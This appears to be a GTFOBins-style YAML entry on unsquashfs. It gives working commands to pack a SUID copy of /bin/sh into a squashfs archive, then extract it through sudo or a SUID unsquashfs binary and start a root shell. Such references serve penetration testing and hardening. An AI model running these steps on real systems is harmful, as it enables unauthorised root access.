---
description: |
  `unsquashfs` preserve the SUID bit when extracting the file system. Prepare an archive beforehand with the following commands as root:

  ```
  cp /bin/sh .
  chmod +s sh
  mksquashfs sh shell
  ```

  Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).
functions:
  sudo:
    - code: |
        sudo unsquashfs shell
        ./squashfs-root/sh -p
  suid:
    - code: |
        ./unsquashfs shell
        ./squashfs-root/sh -p
---
